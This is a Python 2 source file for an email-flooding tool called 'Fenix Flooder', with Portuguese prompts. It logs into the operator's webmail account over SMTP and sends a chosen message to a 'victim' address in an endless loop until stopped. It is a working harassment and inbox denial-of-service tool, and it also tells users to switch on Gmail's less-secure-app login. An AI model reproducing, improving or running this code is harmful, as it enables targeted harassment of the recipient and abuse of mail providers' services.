# -*- coding: utf-8 -*-
import smtplib as s
from os import system, name
from time import sleep

seu_email = ''
sua_senha = ''
obj = ''

MICROSOFT = "smtp.live.com:587"
GMAIL = "smtp.gmail.com:587"
YAHOO = 'smtp.mail.yahoo.com:587'
BOL = 'smtps.bol.com.br:587'
IG = 'smtp.ig.com.br:587'

dicionario_servidores = {
    'gmail.com': GMAIL,
    
    'yahoo.com.br': YAHOO,
    'yahoo.com': YAHOO,
    
    'ig.com.br': IG,

    'bol.com.br': BOL,
    'bol.com': BOL,

    'outlook.com.br': MICROSOFT,
    'outlook.com': MICROSOFT,

    'hotmail.com.br': MICROSOFT,
    'hotmail.com': MICROSOFT,
    
    'live.com.br': MICROSOFT,
    'live.com': MICROSOFT
}

if name == 'nt':
    system('color 02')
    system('exit')

print ' __________'
print '< _______ /'
print ' < ______ /   / (_   FENIX'
print '  < ____ <   (__ \        FLOODER'
print '   < ____\    \ \ '
print '   < _____\\\\_) )'
print '   /           / '
print '  / /_|  )___ / '
print ' / |  / /'
print '/  |  \\ \\__'
print '~~~~     (~~~)                 made by Super23'
print '----------------------------------------------'


def login_em_servidor(server):
    global obj
    obj = s.SMTP(server)
    obj.starttls()
    obj.login(seu_email, sua_senha)


def inserir_dados():
    global seu_email, sua_senha
    seu_email = raw_input("Seu e-mail: ")
    sua_senha = raw_input("Sua senha: ")

    for letra in seu_email:
        if letra == "@":
            arroba_index = seu_email.index("@")
    else:
        servidor = seu_email[arroba_index + 1:]

    if servidor in dicionario_servidores:
        SERVIDOR = dicionario_servidores[servidor]

        try:
            if SERVIDOR == GMAIL:
                try:
                    login_em_servidor(GMAIL)
                except:
                    print "Erro!\nPrimeiro permita que o login em aplicativos menos seguros aqui: goo.gl/IRDi9y"
                    inserir_dados()
            else:
                login_em_servidor(SERVIDOR)

        except s.SMTPAuthenticationError:
            print "E-mail ou senha errados..."
            inserir_dados()

    else:
        system('cls')
        print 'Ainda não suportamos esse servidor de e-mail, tente com outro.'
        print '----------------------------'
        inserir_dados()

inserir_dados()


print ('\n--------------------------')

if obj:
    system('cls')
    print("Logado com sucesso!")
    sleep(3)
    vitima_email = raw_input("Insira o e-mail da vitima: ")
    mensagem = ''
    print('OBS.: Quando quiser para, digite "bye" e dê enter.')
    print('Insira sua mensagem:\n')
    while 1:
        h = raw_input()
        if h.lower() == "bye":
            break
        else:
            mensagem += '\n'
            mensagem += h

numero_emails = int(input("Enviar quantas mensagens a cada 2 minutos? "))
system('cls')
print('+------------------------+')
print('Aperte Ctrl+C para parar')
print('+------------------------+')
num = 0

try:
    while 1:
        for i in range(numero_emails):
            obj.sendmail(seu_email, vitima_email, mensagem)
            num += 1
            print "Foram enviadas", num, 'mensagens'
        print 'Enviadas todas as mensagens dos 2 minutos'
        sleep(180)
except KeyboardInterrupt:
    print("Muito obrigado por usar o FenixFlooder v1.0")
    try:
        input('')
    except:
        obj.quit()
